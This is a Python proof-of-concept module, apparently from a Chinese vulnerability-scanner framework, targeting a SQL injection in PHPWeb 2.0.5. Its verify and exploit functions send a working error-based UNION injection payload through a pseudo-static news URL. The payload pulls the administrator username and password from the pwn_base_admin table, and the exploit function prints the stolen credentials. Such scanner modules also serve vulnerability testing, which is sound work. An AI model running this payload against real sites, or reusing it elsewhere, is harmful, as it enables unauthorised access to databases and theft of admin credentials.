# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PHPWeb_0101'  # 平台漏洞编号，留空
    name = 'PHPWeb 2.0.5 伪静态 SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-28'  # 漏洞公布时间
    desc = '''
        PHPWeb具有各种插件、模板和边框可以自由安装卸载、任意组合排版的特点，可以让网站制作者方便地制作网站。
        PHPWeb 2.0.5 伪静态 SQL注入。
    '''  # 漏洞描述
    ref = 'http://blog.163.com/sjg_admin/blog/static/22682017120139192446513/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPWeb'  # 漏洞应用名称
    product_version = '2.0.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6c9174c5-e871-4424-b98d-e93e1c0040db'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + \
                "/news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html"
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            if content:
                pattern = re.compile(
                    r".*?Duplicate\\s*entry\\s*[']?[0-9]*:(?P<username>[^:]+):(?P<password>[^:]+)", re.I | re.S)
                match = pattern.match(content)
                if match == None:
                    return
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + \
                "/news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html"
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            if content:
                pattern = re.compile(
                    r".*?Duplicate\\s*entry\\s*[']?[0-9]*:(?P<username>[^:]+):(?P<password>[^:]+)", re.I | re.S)
                match = pattern.match(content)
                if match == None:
                    return
                username = match.group('username')
                password = match.group('password')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;username={username}, password={password}'.format(
                    target=self.target, name=self.vuln.name, username=username, password=password))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
